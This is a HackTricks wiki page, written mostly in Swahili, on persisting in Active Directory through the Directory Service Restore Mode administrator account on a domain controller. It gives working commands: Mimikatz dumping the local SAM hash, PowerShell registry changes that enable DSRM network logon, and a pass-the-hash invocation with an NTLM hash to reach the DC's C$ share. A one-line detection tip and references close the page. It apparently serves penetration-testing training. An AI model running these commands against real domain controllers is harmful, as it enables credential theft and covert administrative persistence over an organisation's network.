# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya Msingi

Kuna akaunti ya **local administrator** ndani ya kila **DC**. Ukiwa na privileges za admin kwenye mashine hii, unaweza kutumia mimikatz kufanya **dump** ya **local Administrator hash**. Kisha, ukirekebisha registry ili **activate this password**, unaweza kufikia kwa mbali mtumiaji huyu wa local Administrator.\
Kwanza tunahitaji kufanya **dump** ya **hash** ya mtumiaji wa **local Administrator** ndani ya DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Kisha tunahitaji kuangalia ikiwa akaunti hiyo itafanya kazi, na ikiwa registry key ina thamani ya "0" au haipo, unahitaji **kuiweka kuwa "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Kisha, kwa kutumia PTH unaweza **kuorodhesha yaliyomo kwenye C$ au hata kupata shell**. Zingatia kwamba ili kuunda session mpya ya powershell yenye hiyo hash kwenye memory (kwa ajili ya PTH), **"domain" inayotumika ni jina tu la mashine ya DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Maelezo zaidi kuhusu hili yanapatikana kwenye: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) na [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Upunguzaji wa athari

- Event ID 4657 - Kagua uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Marejeo

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
